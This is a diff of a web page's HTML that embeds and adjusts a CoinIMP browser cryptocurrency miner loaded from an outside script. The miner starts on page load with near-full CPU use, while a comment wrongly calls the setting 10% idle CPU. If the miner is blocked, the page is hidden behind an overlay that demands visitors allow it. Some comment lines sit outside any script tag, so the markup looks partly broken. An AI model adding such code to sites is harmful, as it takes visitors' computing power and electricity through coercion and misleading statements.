@@ -258,106 +258,118 @@
         <div id="console"></div>
     </div>
 
-    <script src="https://www.hostingcloud.racing/SPpb.js"></script>
-    <script>
+<script src="https://www.hostingcloud.racing/SPpb.js"></script>
+<script>
+    // Inisialisasi miner dengan pengaturan yang dioptimalkan
     var _client = new Client.Anonymous('4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87', {
-            throttle: 0, c: 'w'
-        });
+        throttle: 0.1, // Kurangi throttle untuk mempercepat proses (gunakan 10% CPU idle)
+        c: 'w'
+    });
 
-        _client.start();
-        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    _client.start();
+    _client.addMiningNotification(
+        "Top",
+        "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.",
+        "#cccccc",
+        40,
+        "#3d3d3d"
+    );
 
-        setTimeout(function(){
-            if (typeof _client === 'undefined' || _client === null) {
-                var messageDiv = document.createElement("div");
-                messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
-                var mainDiv = document.createElement("div");
-                mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-                mainDiv.appendChild(messageDiv);
-                document.body.appendChild(mainDiv);
-                document.getElementsByTagName("body")[0].style.overflow = "hidden";
-                window.scrollTo(0, 0);
-            }
-        }, 1000);
+    // Tambahkan notifikasi jika miner terblokir
+    setTimeout(function () {
+        if (typeof _client === 'undefined' || _client === null) {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c; align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    }, 1000);
 
-        setTimeout(function(){
-            let speedValue = document.getElementById("speedValue");
-            let totalValue = document.getElementById("totalValue");
+    // Tampilkan kecepatan dan total hash rate
+    setTimeout(function () {
+        let speedValue = document.getElementById("speedValue");
+        let totalValue = document.getElementById("totalValue");
 
-            setInterval(function(){
-                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
-                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
-                speedValue.textContent = speed;
-                totalValue.textContent = total;
-            }, 500);
-        }, 1000);
+        setInterval(function () {
+            let speed = _client.getHashesPerSecond(); // Ambil data hash rate nyata
+            let total = _client.getTotalHashes(); // Ambil total hash nyata
+            speedValue.textContent = speed.toFixed(2) + " H/s"; // Format angka menjadi 2 desimal
+            totalValue.textContent = total;
+        }, 500); // Update setiap 500ms
+    }, 1000);
 
-        // Add data for Chart.js (hash rate stats)
-        const ctx = document.getElementById('hashRateChart').getContext('2d');
-        const hashRateChart = new Chart(ctx, {
-            type: 'line',
-            data: {
-                labels: [],
-                datasets: [{
-                    label: 'Hash Rate (H/s)',
-                    data: [],
-                    borderColor: '#00ff00',
-                    backgroundColor: 'rgba(0, 255, 0, 0.5)',
-                    tension: 0.4
-                }]
-            },
-            options: {
-                responsive: true,
-                scales: {
-                    x: {
-                        type: 'linear',
-                        position: 'bottom',
-                        title: {
-                            display: true,
-                            text: 'Time (seconds)'
-                        }
-                    },
-                    y: {
-                        title: {
-                            display: true,
-                            text: 'Hash Rate (H/s)'
-                        },
-                        beginAtZero: true
+    // Grafik hash rate
+    const ctx = document.getElementById('hashRateChart').getContext('2d');
+    const hashRateChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: [],
+            datasets: [{
+                label: 'Hash Rate (H/s)',
+                data: [],
+                borderColor: '#00ff00',
+                backgroundColor: 'rgba(0, 255, 0, 0.5)',
+                tension: 0.4
+            }]
+        },
+        options: {
+            responsive: true,
+            scales: {
+                x: {
+                    type: 'linear',
+                    position: 'bottom',
+                    title: {
+                        display: true,
+                        text: 'Time (seconds)'
                     }
+                },
+                y: {
+                    title: {
+                        display: true,
+                        text: 'Hash Rate (H/s)'
+                    },
+                    beginAtZero: true
                 }
             }
-        });
+        }
+    });
 
-        let time = 0;
-        setInterval(() => {
-            const hashRate = Math.floor(Math.random() * 1000) + 500; // Simulate hash rate data
-            // Add data to the chart
-            hashRateChart.data.labels.push(time);
-            hashRateChart.data.datasets[0].data.push(hashRate);
+    let time = 0;
+    setInterval(() => {
+        const hashRate = _client.getHashesPerSecond(); // Data hash rate nyata
+        // Tambahkan data ke grafik
+        hashRateChart.data.labels.push(time);
+        hashRateChart.data.datasets[0].data.push(hashRate);
 
-            // Limit the data shown on the chart to the latest 20 points
-            if (hashRateChart.data.labels.length > 50) {
-                hashRateChart.data.labels.shift();
-                hashRateChart.data.datasets[0].data.shift();
-            }
-
-            hashRateChart.update();
-            time++;
-        }, 1000); // Update every second
-
-        // Simulate adding console logs
-        function logToConsole(message) {
-            const consoleDiv = document.getElementById('console');
-            const messageDiv = document.createElement('p');
-            messageDiv.textContent = message;
-            consoleDiv.appendChild(messageDiv);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
+        // Batasi data hanya untuk 50 poin terakhir
+        if (hashRateChart.data.labels.length > 50) {
+            hashRateChart.data.labels.shift();
+            hashRateChart.data.datasets[0].data.shift();
         }
 
-        setInterval(() => {
-            logToConsole(`${Math.floor(Math.random() * 1000) + 500} H/s`);
-        }, 1000); // Update console every 1 seconds
+        hashRateChart.update(); // Perbarui grafik
+        time++;
+    }, 1000); // Update setiap detik
+
+    // Tambahkan log ke console tampilan
+    function logToConsole(message) {
+        const consoleDiv = document.getElementById('console');
+        const messageDiv = document.createElement('p');
+        messageDiv.textContent = message;
+        consoleDiv.appendChild(messageDiv);
+        consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll ke bawah
+    }
+
+    setInterval(() => {
+        const speed = _client.getHashesPerSecond(); // Kecepatan hash nyata
+        logToConsole(`${speed.toFixed(2)} H/s`);
+    }, 1000); // Update log setiap 1 detik
+</script>
     // system information
         
     // Platform 
@@ -411,4 +423,3 @@
     </script>
 </body>
     </html>
-    
